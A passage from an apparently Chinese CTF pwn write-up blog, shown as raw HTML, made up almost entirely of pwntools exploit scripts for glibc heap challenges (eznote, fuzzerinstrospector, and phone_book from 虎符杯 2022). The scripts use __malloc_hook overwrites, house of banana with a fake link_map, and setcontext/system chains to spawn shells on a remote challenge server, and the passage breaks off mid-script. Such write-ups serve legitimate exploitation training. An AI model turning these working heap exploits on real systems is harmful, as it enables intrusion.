&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, size, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Command: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&#x27;Len: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendlineafter(<span class="hljs-string">&#x27;Data: &#x27;</span>, content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Command: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Command: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-comment"># gdb.attach(p)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(<span class="hljs-number">0xe8</span>)<br>add(<span class="hljs-number">0x68</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>free()<br><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x78</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x19</span> ,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + <span class="hljs-string">&#x27;\xf1&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>free()<br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>edit(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0xf0</span>))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x78</span>)<span class="hljs-comment">#2</span><br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Data: &#x27;</span>)<br>data = p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<br>libc_base = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br><span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;\xc2&#x27;</span>:<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">elif</span> i == <span class="hljs-string">&#x27;\xc3&#x27;</span>:<br>exit()<br><span class="hljs-keyword">else</span>:<br>libc_base += i<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(libc_base) != <span class="hljs-number">6</span>:<br>p.close()<br>success(<span class="hljs-string">&#x27;libc_arena -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(u64(libc_base.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)))))<br>libc_base = u64(libc_base.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<span class="hljs-comment"># + 0x40004000</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;malloc_hook -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(malloc_hook)))<br>one_gadget = [<span class="hljs-number">0x4f2a5</span>, <span class="hljs-number">0x4f302</span>, <span class="hljs-number">0x10a2fc</span>]<br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>free()<br>edit(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>, p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">4</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x13</span> + p64(one_gadget[<span class="hljs-number">1</span>] + libc_base))<br><br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Command: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h2><p>libc 2.35，第一次做2.35的题，赛后用house of banana搞定了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./eznote&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote([<span class="hljs-string">&#x27;39.105.185.193&#x27;</span>, <span class="hljs-number">30007</span>], stdin=PTY,raw=<span class="hljs-literal">False</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Idx: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br>gdb.attach(p)<br><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x4a8</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x478</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#4</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>) <span class="hljs-comment">#5-6</span><br><br>add(<span class="hljs-number">0x1561</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#7</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Note0:\n&#x27;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x20d0</span><span class="hljs-comment">#&amp; 0xfffffffff000</span><br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>free(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x1140</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#0</span><br><br>show(<span class="hljs-number">4</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x219ce0</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>rtld_global = libc_base + <span class="hljs-number">0x278040</span><br><br>free(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#6&lt;-&gt;4</span><br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">4</span>)<br><span class="hljs-comment"># add(0x4a8, &#x27;verf1sh\n&#x27;)#6&lt;-&gt;1</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x408</span> + p64(<span class="hljs-number">0x4b1</span>) <br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x4a8</span> + p64(<span class="hljs-number">0x411</span>) <br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x408</span> + p64(<span class="hljs-number">0x481</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">0</span>, payload)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x600</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#4</span><br><br>free(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># free(4)</span><br><br><span class="hljs-comment"># show(2)</span><br><span class="hljs-comment"># p.recvuntil(&#x27;Note2:\n&#x27;)</span><br><span class="hljs-comment"># heap_base = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;)) &amp; 0xfffffffff000</span><br><span class="hljs-comment"># success(&#x27;heap_base -&gt; &#123;&#125;&#x27;.format(hex(heap_base)))</span><br>payload = p64(libc_base + <span class="hljs-number">0x21a0f0</span>)*<span class="hljs-number">2</span> + p64(heap_base+<span class="hljs-number">0x750</span>) + p64(rtld_global-<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x408</span> + p64(<span class="hljs-number">0x4b1</span>) + payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;verf1sh\n&#x27;</span>)<span class="hljs-comment">#3</span><br><span class="hljs-comment"># pause()</span><br><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>ret = libc_base + <span class="hljs-number">0x0000000000029cd6</span><br>bin_sh = libc_base + <span class="hljs-number">0x00000000001d8698</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>fake_link_map_data = p64(<span class="hljs-number">0</span>) + p64(libc_base+<span class="hljs-number">0x279890</span>) + p64(<span class="hljs-number">0</span>)<br>fake_link_map_data += p64(heap_base+<span class="hljs-number">0x1010</span>)<br>fake_link_map_data += p64(setcontext+<span class="hljs-number">61</span>) + p64(ret)<br>fake_link_map_data += p64(bin_sh) + p64(ret) + p64(system)<br>fake_link_map_data += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span><br>fake_link_map_data += p64(heap_base + <span class="hljs-number">0x1010</span> + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x28</span>)<br>fake_link_map_data += p64(pop_rdi)<br>fake_link_map_data = fake_link_map_data.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_link_map_data += p64(heap_base + <span class="hljs-number">0x1010</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">0x110</span>)*<span class="hljs-number">0x3</span><br>fake_link_map_data += p64(<span class="hljs-number">0x10</span>)<br>fake_link_map_data = fake_link_map_data.ljust(<span class="hljs-number">0x31C</span> - <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_link_map_data += p8(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">4</span><br><span class="hljs-comment"># rdx = len(payload) - 8</span><br><br><span class="hljs-comment"># payload = payload.ljust(0x70+rdx, &#x27;\0&#x27;) + p64(free_hook&amp;0xfffffffffffff000)#rsi</span><br><span class="hljs-comment"># payload = payload.ljust(0x68+rdx, &#x27;\0&#x27;) + p64(0)#rdi</span><br><span class="hljs-comment"># payload = payload.ljust(0x88+rdx, &#x27;\0&#x27;) + p64(0x2000)#rdx</span><br><span class="hljs-comment"># payload = payload.ljust(0xa0+rdx, &#x27;\0&#x27;) + p64((free_hook&amp;0xfffffffffffff000)+8)#bytes(frame)</span><br><span class="hljs-comment"># payload = payload.ljust(0xa0+rdx, &#x27;\0&#x27;) + p64(syscall)#rip</span><br><span class="hljs-comment"># payload = payload.ljust(0x100,&#x27;\x00&#x27;)</span><br><span class="hljs-comment"># payload += p64(heap_base + 0x3380 + 0x10 + 0x110)*0x3</span><br><span class="hljs-comment"># payload += p64(0x10)</span><br><span class="hljs-comment"># payload = payload.ljust(0x31C - 0x10,b&#x27;\x00&#x27;)</span><br><span class="hljs-comment"># payload += p8(0x8) + b&#x27;\x00&#x27;*4</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x408</span> + p64(<span class="hljs-number">0x4b1</span>) <br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x4a8</span> + p64(<span class="hljs-number">0x411</span>) <br>payload += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x400</span> + p64(heap_base + <span class="hljs-number">0x1030</span>) + p64(<span class="hljs-number">0</span>) + fake_link_map_data + <span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">0</span>, payload)<br>pause()<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br>pause()<br></code></pre></td></tr></table></figure><h2 id="fuzzerinstrospector"><a href="#fuzzerinstrospector" class="headerlink" title="fuzzerinstrospector"></a>fuzzerinstrospector</h2><p>都有点忘了题目的逻辑了，当时做的时候在泄露libc的时候卡了一会儿，重点是用scanf的trick让我们的输入略过 不覆盖libc，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./fuzzerinstrospector&#x27;</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;39.105.185.193&#x27;</span>, <span class="hljs-number">30007</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_index</span>(<span class="hljs-params">content</span>):</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(<span class="hljs-number">1</span>) == <span class="hljs-built_in">type</span>(content):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: %s: &#x27;</span>%<span class="hljs-built_in">str</span>(i), <span class="hljs-built_in">str</span>((content &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>))<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: %s: &#x27;</span>%<span class="hljs-built_in">str</span>(i), content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">index, content, content2=<span class="hljs-number">0</span></span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>add_index(content2)<br>p.sendafter(<span class="hljs-string">&#x27;Bitmap: &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>add_index(<span class="hljs-number">0x0</span>)<br>p.sendafter(<span class="hljs-string">&#x27;Bitmap: &#x27;</span>, content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params">addr</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(addr))<br><span class="hljs-comment"># gdb.attach(p, &#x27;b *$rebase(0xE2B)&#x27;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>add(i, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>)<br><br><span class="hljs-comment"># # pause()</span><br><span class="hljs-comment"># # backdoor(0x7fff3cdec1b8)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>free(<span class="hljs-number">8</span>-i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add(i, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>)<br><br>payload = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>payload += p8(i)<br>add(<span class="hljs-number">7</span>, payload , <span class="hljs-string">&#x27;-&#x27;</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">7</span>)<br>libc_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>p.recvuntil(<span class="hljs-string">&#x27;Bit: &#x27;</span>)<br>libc_base = (<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">10</span>) &lt;&lt; <span class="hljs-number">8</span>*i) + libc_base<br>libc_base = libc_base - <span class="hljs-number">624</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment"># # one_gadget = [0x4f2a5, 0x4f302, 0x10a2fc]</span><br><span class="hljs-comment"># # pause()</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;/bin/sh;&#x27;</span>.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;a&#x27;</span>), <span class="hljs-number">0x3b68732f6e69622f</span>)<br>backdoor(system)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="虎符杯-2022"><a href="#虎符杯-2022" class="headerlink" title="虎符杯 2022"></a>虎符杯 2022</h1><p>有三道pwn，这个book是C++ pwn，还有两道分别是unicorn和ppc<del>有机会再复现记录一些。</del></p><h2 id="phone-book"><a href="#phone-book" class="headerlink" title="phone_book"></a>phone_book</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span 